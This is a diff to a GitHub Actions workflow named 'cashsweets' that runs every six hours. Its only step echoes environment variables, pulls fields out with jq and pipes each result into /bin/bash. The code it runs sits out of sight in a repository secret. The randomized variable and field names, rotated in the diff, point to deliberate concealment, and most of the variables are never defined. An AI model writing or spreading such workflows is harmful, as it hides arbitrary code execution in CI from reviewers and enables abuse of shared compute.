@@ -1,9 +1,9 @@
 name: cashsweets
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 2/6 * * *'
+    - cron: '41 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: cashsweets
         env:
-          xyvrk85: ${{ secrets.xyvrk85 }}
+          b7: ${{ secrets.b7 }}
         run: |
-          echo $xyvrk85 | jq -r .zq284 | /bin/bash
-          echo $kakox9 | jq -r .r92 | /bin/bash
-          echo $gfasu48553 | jq -r .ux5 | /bin/bash
-          echo $om622 | jq -r .u9 | /bin/bash
-          echo $tihp6 | jq -r .ohuvz39759 | /bin/bash
-          echo $daw57 | jq -r .og0491 | /bin/bash
-          echo $gagkq84710 | jq -r .f84 | /bin/bash
+          echo $b7 | jq -r .rx02020 | /bin/bash
+          echo $pqh384 | jq -r .aywxr82805 | /bin/bash
+          echo $un7 | jq -r .bet53 | /bin/bash
+          echo $dt059 | jq -r .zey6595 | /bin/bash
+          echo $xtg2419 | jq -r .rmu3125 | /bin/bash
+          echo $d1 | jq -r .xy34882 | /bin/bash
+          echo $iz6 | jq -r .pawpg398 | /bin/bash
 
